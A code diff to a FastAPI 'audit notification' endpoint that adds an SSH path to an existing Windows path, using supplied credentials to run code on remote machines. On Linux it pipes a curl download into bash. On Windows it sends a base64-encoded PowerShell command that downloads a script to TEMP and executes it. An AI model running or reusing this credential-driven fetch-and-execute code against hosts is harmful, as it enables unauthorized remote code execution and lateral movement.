@@ -2438,9 +2438,46 @@ class NotificationRequest(BaseModel):
     username: str
     password: str
     method: str = "auto"
+    target_os: str = "windows"
+    server_url: str = ""
+    message: str = "IT Compliance Audit Required"
 
 @app.post("/audit/send-notification")
 def send_notification(req: NotificationRequest):
+    server_url = req.server_url or f"http://{socket.gethostbyname(socket.gethostname())}:8000"
+    client_id = f"audit_{uuid.uuid4().hex[:12]}"
+    results = {}
+
+    # ── Linux / macOS via SSH ──
+    if req.target_os == "linux":
+        try:
+            import paramiko
+        except ImportError:
+            paramiko = None
+        if not paramiko:
+            raise HTTPException(status_code=500, detail="Missing paramiko library. Install with: pip install paramiko")
+
+        ssh_cmd = f'curl -s "{server_url}/download-mac-script?client_id={client_id}" | bash'
+        try:
+            logger.info(f"SSH audit on {req.ip_address} as {req.username}")
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(req.ip_address, port=22, username=req.username, password=req.password, timeout=15)
+            stdin, stdout, stderr = ssh.exec_command(ssh_cmd, timeout=120)
+            exit_code = stdout.channel.recv_exit_status()
+            ssh.close()
+            if exit_code == 0:
+                return {"status": "success", "method": "ssh", "message": "Audit executed via SSH."}
+            else:
+                err_out = stderr.read().decode("utf-8", errors="ignore")[:500]
+                results["ssh"] = err_out or f"Exit code {exit_code}"
+        except Exception as e:
+            logger.error(f"SSH failed on {req.ip_address}: {e}")
+            results["ssh"] = str(e)
+
+        raise HTTPException(status_code=500, detail={"message": "SSH remote audit failed.", "errors": results})
+
+    # ── Windows via WinRM / PsExec ──
     try:
         import winrm as winrm_lib
     except ImportError:
@@ -2452,10 +2489,7 @@ def send_notification(req: NotificationRequest):
     if not winrm_lib and not PsExecClient:
         raise HTTPException(status_code=500, detail="Missing winrm or pypsexec libraries.")
     winrm = winrm_lib
-    
-    server_url = f"http://{socket.gethostbyname(socket.gethostname())}:8000"
-    client_id = f"audit_{uuid.uuid4().hex[:12]}"
-    
+
     ps_payload = f"""
 $User = (Get-WmiObject -Class Win32_ComputerSystem).UserName
 if (-not $User) {{ exit 1 }}
@@ -2487,13 +2521,12 @@ Read-Host
 Invoke-WebRequest -Uri '{server_url}/api/get-audit-script?client_id={client_id}' -OutFile '$env:TEMP\\audit.ps1'
 & '$env:TEMP\\audit.ps1'
 """
-    
+
     encoded_cmd = base64.b64encode(ps_payload.encode('utf-16le')).decode('utf-8')
     cmd = f'powershell.exe -NoProfile -EncodedCommand {encoded_cmd}'
-    
-    results = {}
+
     methods_to_try = ["winrm", "psexec"] if req.method == "auto" else [req.method]
-    
+
     for method in methods_to_try:
         try:
             logger.info(f"Sending notification to {req.ip_address} using {method}")
@@ -2523,7 +2556,7 @@ Invoke-WebRequest -Uri '{server_url}/api/get-audit-script?client_id={client_id}'
         except Exception as e:
             logger.error(f"Failed to send notification via {method} on {req.ip_address}: {e}")
             results[method] = str(e)
-            
+
     raise HTTPException(status_code=500, detail={"message": "All attempted remote execution methods failed.", "errors": results})
 
 @app.get("/api/get-audit-script")
